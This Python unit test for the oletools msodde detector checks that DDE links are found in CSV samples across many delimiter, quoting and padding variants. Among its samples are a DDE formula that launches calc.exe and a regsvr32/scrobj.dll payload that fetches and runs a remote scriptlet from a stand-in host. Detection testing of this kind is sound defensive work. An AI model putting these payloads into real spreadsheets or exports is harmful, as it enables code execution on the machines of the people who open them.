#!/usr/bin/env python3


""" Check various csv examples """

import unittest
from tempfile import mkstemp
import os

from oletools import msodde
from tests.test_utils import OutputCapture


class TestCSV(unittest.TestCase):
    """ Check various csv examples """

    DO_DEBUG = False

    def test_texts(self):
        """ write some sample texts to file, run those """
        SAMPLES = (
            "=cmd|'/k ..\\..\\..\\Windows\\System32\\calc.exe'!''",
            "=MSEXCEL|'\\..\\..\\..\Windows\System32\\regsvr32 /s /n /u " +
            "/i:http://RemoteIPAddress/SCTLauncher.sct scrobj.dll'!''",
            "completely innocent text"
        )

        LONG_SAMPLE_FACTOR = 100   # make len(sample) > CSV_SMALL_THRESH
        DELIMITERS = ',\t ;|^'
        QUOTES = '', '"'   # no ' since samples use those "internally"
        PREFIXES = ('', '{quote}item-before{quote}{delim}',
                    '{quote}line{delim}before{quote}\n'*LONG_SAMPLE_FACTOR,
                    '{quote}line{delim}before{quote}\n'*LONG_SAMPLE_FACTOR +
                    '{quote}item-before{quote}{delim}',
                   )
        SUFFIXES = ('', '{delim}{quote}item-after{quote}',
                    '\n{quote}line{delim}after{quote}'*LONG_SAMPLE_FACTOR,
                    '{delim}{quote}item-after{quote}' +
                    '\n{quote}line{delim}after{quote}'*LONG_SAMPLE_FACTOR,
                   )

        for sample_core in SAMPLES:
            for prefix in PREFIXES:
                for suffix in SUFFIXES:
                    for delim in DELIMITERS:
                        for quote in QUOTES:
                            # without quoting command is split at space or |
                            if quote == '' and delim in sample_core:
                                continue

                            sample = \
                                prefix.format(quote=quote, delim=delim) + \
                                quote + sample_core + quote + \
                                suffix.format(quote=quote, delim=delim)
                            output = self.write_and_run(sample)
                            n_links = len(self.get_dde_from_output(output))
                            desc = 'sample with core={0!r}, prefix-len {1}, ' \
                                   'suffix-len {2}, delim {3!r} and quote ' \
                                   '{4!r}'.format(sample_core, len(prefix),
                                                  len(suffix), delim, quote)
                            if 'innocent' in sample:
                                self.assertEqual(n_links, 0, 'found dde-link '
                                                             'in clean sample')
                            else:
                                msg = 'Failed to find dde-link in ' + desc
                                self.assertEqual(n_links, 1, msg)
                            if self.DO_DEBUG:
                                print('Worked: ' + desc)

    def write_and_run(self, sample_text):
        """ helper for test_texts: save text to file, run through msodde """
        filename = None
        handle = 0
        try:
            handle, filename = mkstemp(prefix='oletools-test-csv-', text=True)
            os.write(handle, sample_text.encode('ascii'))
            os.close(handle)
            handle = 0
            args = [filename, ]
            if self.DO_DEBUG:
                args += ['-l', 'debug']

            with OutputCapture() as capturer:
                capturer.reload_module(msodde)    # re-create logger
                ret_code = msodde.main(args)
            self.assertEqual(ret_code, 0, 'checking sample resulted in '
                                          'error:\n' + sample_text)
            return capturer

        except Exception:
            raise
        finally:
            if handle:
                os.close(handle)
                handle = 0   # just in case
            if filename:
                if self.DO_DEBUG:
                    print('keeping for debug purposes: {0}'.format(filename))
                else:
                    os.remove(filename)
                filename = None   # just in case

    def get_dde_from_output(self, capturer):
        """ helper to read dde links from captured output """
        have_start_line = False
        result = []
        for line in capturer:
            if self.DO_DEBUG:
                print('captured: ' + line)
            if not line.strip():
                continue   # skip empty lines
            if have_start_line:
                result.append(line)
            elif line == 'DDE Links:':
                have_start_line = True

        self.assertTrue(have_start_line) # ensure output was complete
        return result


# just in case somebody calls this file as a script
if __name__ == '__main__':
    unittest.main()
